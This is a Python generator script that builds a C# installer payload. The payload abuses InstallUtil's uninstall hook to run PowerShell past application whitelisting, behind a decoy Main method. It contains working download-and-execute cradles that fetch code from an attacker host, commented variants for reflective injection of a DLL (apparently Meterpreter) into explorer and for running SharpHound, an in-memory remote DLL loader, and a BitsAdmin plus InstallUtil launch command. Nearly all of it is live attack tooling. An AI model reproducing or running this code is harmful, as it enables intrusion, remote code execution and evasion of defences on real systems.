#!/bin/env python3
import ak

BASE_FILENAME = 'win_installutil_ps_runner'
FN_CS = BASE_FILENAME + ".cs"

# Stage2 loader:
PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{ak.LHOST}/run.txt') | IEX"
#PS_CMD = r"cmd.exe /c C:\\windows\\tasks\\SharpHound.exe"
# PS_CMD = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/InvokeReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; InvokeReflectivePEInjection -PEBytes $bytes -ProcId $procid";

def generate():

  template = """
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
namespace Foonaria
{{
   class Program
   {{
       static void Main(string[] args)
       {{
	   Console.WriteLine("This is the main method which is a decoy");
       }}
   }}
   [System.ComponentModel.RunInstaller(true)]
   public class Sample : System.Configuration.Install.Installer
   {{
       public override void Uninstall(System.Collections.IDictionary savedState)
       {{
	   String cmd = "{PS_CMD}";

	   Runspace rs = RunspaceFactory.CreateRunspace();
	   rs.Open();
	   PowerShell ps = PowerShell.Create();
	   ps.Runspace = rs;
	   ps.AddScript(cmd);
	   ps.Invoke();
	   rs.Close();
       }}
   }} }}
""".format(PS_CMD=PS_CMD)

  print(template)
  ak.write_file(FN_CS, template)

  print("-"*50)
  ps_template = """
  $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/DLL-Runner-x86.dll')
  $assem = [System.Reflection.Assembly]::Load($data) 
                                                                                                      
  $class = $assem.GetType('DLL_Runner.Class1')
  $method = $class.GetMethod("runner")
  $method.Invoke(0, $null)
  """.format(lhost=ak.LHOST)

  print("Use code like this for stage2: " + ps_template)

def main():
  generate()
  ak.cs_compile(FN_CS, "/r:libraries/System.Management.Automation.dll,libraries/System.Configuration.Install.dll")

  print("Wrote to: "+ BASE_FILENAME + ".cs")
  print("Run with: cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp")
  print("Compile DLL runner")

if __name__ == "__main__":
  main()
